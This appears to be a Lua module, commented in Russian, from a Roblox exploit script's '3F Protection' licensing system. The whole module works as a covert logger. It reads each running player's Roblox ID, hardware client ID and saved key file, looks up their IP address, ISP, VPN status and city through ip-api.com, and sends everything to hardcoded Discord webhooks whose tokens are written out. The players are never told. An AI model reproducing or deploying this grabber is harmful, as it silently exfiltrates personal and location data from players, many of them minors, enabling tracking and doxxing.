-- =============================================================
-- ЛОГГЕР / ФАКТОР 2 (ОТКРЫТЫЙ ИСХОДНИК)
-- =============================================================
return function(SEC_STATE)
    if not SEC_STATE or not SEC_STATE.ORIG then return end
    local O = SEC_STATE.ORIG
    local LocalPlayer = SEC_STATE.LocalPlayer
    local HttpService = SEC_STATE.HttpService
    local RbxAnalytics = SEC_STATE.RbxAnalytics
    local UserInputService = SEC_STATE.UserInputService
    local request = O.request
    local pcall = O.pcall
    local type = O.type
    local tostring = O.tostring
    local m_floor = O.math_floor
    local s_lower = O.s_lower
    local s_char = O.s_char
    local s_sub = O.s_sub
    local task_wait = O.task_wait
    local task_spawn = O.task_spawn
    local tinsert = table.insert

    -- ВЕБХУКИ
    local WEBHOOK_LOG   = "https://discord.com/api/webhooks/1519409915155838593/sw3cuWpE-S2SVYHM0r1MSEvv8XiLcE_ePdR-RwqxWfQ94cHPccRsd02RwcVYsG77Aga"
    local WEBHOOK_ALERT = "https://discord.com/api/webhooks/1518334033588838182/s1d18Avu2EmWpzTrT0jNIhjT6e1J57YX70OXHMVxxcyuSSw6L6nrBAjwVspga-L7SNKO"

    -- СОБИРАЕМ ИНФОРМАЦИЮ
    local uid = tostring(LocalPlayer.UserId)
    local hwid = "N/A"
    pcall(function() hwid = RbxAnalytics:GetClientId() end)
    local key = "N/A"
    pcall(function() key = O.readfile("nazarkus_key.json") end)

    -- ВАЙТЛИСТ/БЛЭКЛИСТ
    local WL = {
        UIDs = {"10760143653"},
        HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
        Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F", "89D11F50-5490-4677-B709-4EBFBECA78CE"}
    }
    local BL = {UIDs={}, HWIDs={}, Keys={}}

    local function inList(lst)
        if not lst or type(lst) ~= "table" then return false end
        for _, v in ipairs(lst.UIDs or {}) do if v == uid then return true end end
        for _, v in ipairs(lst.HWIDs or {}) do if v == hwid then return true end end
        for _, v in ipairs(lst.Keys or {}) do if v == key then return true end end
        return false
    end

    local userStatus = inList(WL) and "whitelist" or (inList(BL) and "blacklist" or "guest")
    local spyFound = SEC_STATE.detected or false
    local spyReason = SEC_STATE.reason or "None"
    SEC_STATE.status = userStatus
    SEC_STATE.hwid = hwid
    SEC_STATE.key = key

    -- ИНФА ОБ ЭКЗЕКЬЮТОРЕ
    local execName = "Unknown"
    local uncPct = 0
    pcall(function()
        local cnt = 0
        local genv = getgenv and getgenv() or _G
        local check = {"getgenv","getrawmetatable","hookfunction","setreadonly"}
        for _, n in ipairs(check) do if genv[n] then cnt = cnt + 1 end end
        uncPct = m_floor((cnt/#check)*100)
        if identifyexecutor then pcall(function() execName = identifyexecutor() end) end
    end)
    local execStr = execName .. " (UNC: " .. uncPct .. "%)"

    -- СЕТЕВАЯ ИНФА
    local net = {ip="N/A", isp="N/A", vpn="No", country="N/A", city="N/A"}
    pcall(function()
        local r = request({
            Url = "http://ip-api.com/json/?fields=status,country,city,isp,query,proxy",
            Method = "GET"
        })
        if r and r.Success and r.Body then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, r.Body)
            if ok and data and type(data) == "table" then
                net.ip = data.query or "N/A"
                net.isp = data.isp or "N/A"
                net.vpn = data.proxy and "Yes" or "No"
                net.country = data.country or "N/A"
                net.city = data.city or "N/A"
            end
        end
    end)

    -- ФОРМИРУЕМ EMBED
    local embeds = {}

    if spyFound then
        -- 🚨 АЛЕРТ НА СПАЙ (КРАСНЫЙ)
        tinsert(embeds, {
            title = "🚨 SECURITY ALERT: HTTP Spy Detected",
            color = 16711680,
            fields = {
                {name = "Detection Reason", value = "```" .. tostring(spyReason) .. "```", inline = false},
                {name = "Player", value = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nID: `" .. uid .. "`", inline = false},
                {name = "Executor", value = execStr, inline = true},
                {name = "System", value = UserInputService.TouchEnabled and "Mobile" or "PC", inline = true},
                {name = "Hardware", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false},
                {name = "Network", value = "IP: " .. net.ip .. "\nISP: " .. net.isp .. "\nVPN: " .. net.vpn .. "\nLocation: " .. net.country .. ", " .. net.city, inline = false},
                {name = "Profile", value = "[Link](https://www.roblox.com/users/" .. uid .. "/profile)", inline = false}
            },
            footer = {text = "3F Protection • SPY DETECTED • " .. os.date("%d.%m.%Y %H:%M")}
        })
        -- ОТПРАВЛЯЕМ НА АЛЕРТ ВЕБХУК СРАЗУ, ЖДЁМ ОТВЕТ
        pcall(function()
            local res = request({
                Url = WEBHOOK_ALERT,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({embeds = embeds})
            })
            -- Небольшая пауза чтобы запрос точно ушёл
            task_wait(0.3)
        end)
        return
    end

    if userStatus == "whitelist" then
        -- ✅ ВАЙТЛИСТ КОРОТКИЙ ЛОГ (ЗЕЛЁНЫЙ)
        tinsert(embeds, {
            title = "✅ Whitelisted User Executed",
            color = 65280,
            fields = {
                {name = "**Player Info**", value = "Name: " .. LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nUser ID: `" .. uid .. "`", inline = false},
                {name = "**Executor**", value = execStr, inline = false},
                {name = "**System**", value = "Platform: " .. (UserInputService.TouchEnabled and "Mobile" or "PC"), inline = false},
                {name = "**Hardware Info**", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false}
            },
            footer = {text = "3F Protection • WHITELIST • " .. os.date("%d.%m.%Y %H:%M")}
        })
    else
        -- ⚠️ ГОСТЬ / ⛔ БЛЭКЛИСТ ПОЛНЫЙ ЛОГ
        tinsert(embeds, {
            title = userStatus == "blacklist" and "⛔ Blacklisted User Attempt" or "⚠️ Guest User Executed",
            color = userStatus == "blacklist" and 0 or 16753920,
            fields = {
                {name = "Player Info", value = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nID: `" .. uid .. "`\nAccount Age: " .. LocalPlayer.AccountAge .. " days", inline = false},
                {name = "Executor", value = execStr, inline = true},
                {name = "System", value = UserInputService.TouchEnabled and "Mobile" or "PC", inline = true},
                {name = "Hardware", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false},
                {name = "Network", value = "IP: " .. net.ip .. "\nISP: " .. net.isp .. "\nVPN: " .. net.vpn .. "\nLocation: " .. net.country .. ", " .. net.city, inline = false},
                {name = "Profile", value = "[Link](https://www.roblox.com/users/" .. uid .. "/profile)", inline = false}
            },
            footer = {text = "3F Protection • " .. string.upper(userStatus) .. " • " .. os.date("%d.%m.%Y %H:%M")}
        })
    end

    -- ОТПРАВЛЯЕМ ОБЫЧНЫЙ ЛОГ
    pcall(function()
        request({
            Url = WEBHOOK_LOG,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({embeds = embeds})
        })
        task_wait(0.3)
    end)
end
